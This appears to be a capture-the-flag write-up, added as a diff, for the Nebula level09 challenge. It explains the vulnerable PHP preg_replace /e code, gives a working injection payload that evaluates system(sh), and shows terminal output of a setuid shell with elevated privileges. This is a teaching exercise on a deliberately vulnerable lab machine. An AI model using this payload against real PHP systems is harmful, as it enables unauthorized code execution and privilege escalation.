@@ -1,0 +1,101 @@
+Question URL: https://exploit.education/nebula/level-09/
+
+Source Code:
+<?php
+
+function spam($email)
+{
+  $email = preg_replace("/\./", " dot ", $email);
+  $email = preg_replace("/@/", " AT ", $email);
+  
+  return $email;
+}
+
+function markup($filename, $use_me)
+{
+  $contents = file_get_contents($filename);
+
+  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
+  $contents = preg_replace("/\[/", "<", $contents);
+  $contents = preg_replace("/\]/", ">", $contents);
+
+  return $contents;
+}
+
+$output = markup($argv[1], $argv[2]);
+
+print $output;
+
+?>
+
+Information gathering:
+a. Under /home/falg09, there is a flag09 file with setuid set and level09 has group r-x privilege.
+level09@nebula:/home/flag09$ ls -al
+total 13
+drwxr-x--- 2 flag09 level09   98 2011-11-20 21:22 .
+drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
+-rw-r--r-- 1 flag09 flag09   220 2011-05-18 02:54 .bash_logout
+-rw-r--r-- 1 flag09 flag09  3353 2011-05-18 02:54 .bashrc
+-rwsr-x--- 1 flag09 level09 7240 2011-11-20 21:22 flag09
+-rw-r--r-- 1 root   root     491 2011-11-20 21:22 flag09.php
+-rw-r--r-- 1 flag09 flag09   675 2011-05-18 02:54 .profile
+
+b. flag09 program requires 2 arguments, the first argument is a filename and the second argument is any value(not used)
+level09@nebula:/home/flag09$ echo "Hi php" > /tmp/hiphp
+level09@nebula:/home/flag09$ ./flag09 /tmp/hiphp any_value
+Hi php
+
+
+Backgorud knowledge:
+a. flag09 program code analysis
+- markup() function reads the given filename and if the read content includes [email any_thing] pattern, call spam() with the substring
+as a parameter. spam() function simply replaces . with DOT and @ with AT.
+ Code: preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
+ /(\[email (.*)\])/ - Pattern is starting with "[email" and any strings until it finds "]"
+ spam(\"\\2\") - Pattern is the second subpattern from the text captured
+ 
+ ** Regular expression
+  : Patterns are specified between starting-forward-slash and ending-forward-slash 
+    /..any patterns ../
+  : "(" is for literal parenthesis use which is literal text match
+  : Backreferences - "\2" in spam(\"\\2\")
+    You can refer to the text captured earlier in a pattern.  \1 refers to the contents of the first subpattern, 
+    \2 refers to the second, and so on. If a text is "[email hello world]", \2 means "hello world"
+  
+- preg_replace() php function
+ : preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
+   preg_replace searches subject for matches to pattern and replaces them with replacement.
+   
+ : preg_replace with pattern modifier - e after forward-slash (Deprecated in PHP 5.5 and removed in PHP 7.0 for security reason)
+   If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string, 
+   evaluates it as PHP code, and uses the result for replacing the search string. Single quotes, double quotes, backslashes 
+   (\) and NULL chars will be escaped by backslashes in substituted backreferences.
+
+Sol.
+a. Create a file which includes matching pattern. The second subpattern (/2) should call a shell.
+level09@nebula:/home/flag09$ echo '[email {${system(sh)}}]' >/tmp/mytxt
+level09@nebula:/home/flag09$ more /tmp/mytxt
+[email {${system(sh)}}]
+** The second subpattern is {${system(sh)}}. Now PHP would evaluate the subpattern as a php code. When PHP sees the first {}, it needs to
+evaluate the following text, ${system(sh)}. When PHP evaluates ${system(sh)}, it would think this is a variable and sees another curly 
+braces and tries to evalauate the string with curly braces, system(sh). Bang! now when PHP evaluates system(sh), it would run a shell
+with the privilege of flag09.
+
+b. Call flag09 with a /tmp/mytxt as the first parameter and any random text as the second parameter
+level09@nebula:/home/flag09$ ./flag09 /tmp/mytxt any_text
+PHP Notice:  Use of undefined constant sh - assumed 'sh' in /home/flag09/flag09.php(15) : regexp code on line 1
+sh-4.2$ id
+uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+sh-4.2$
+
+** system(bash) wan't executed as flag09 privilege. only works when system(sh) is provided. Also I failed to use forwarding slash
+like system(/bin/sh) **
+ 
+  
+  References:
+  - Parentheses use in regular expression: https://unbounded.systems/blog/3-kinds-of-parentheses-are-you-a-regex-master/
+  - Regular Expression Exercise: https://regexr.com/
+  - preg_replace vulnerability: https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace
+  
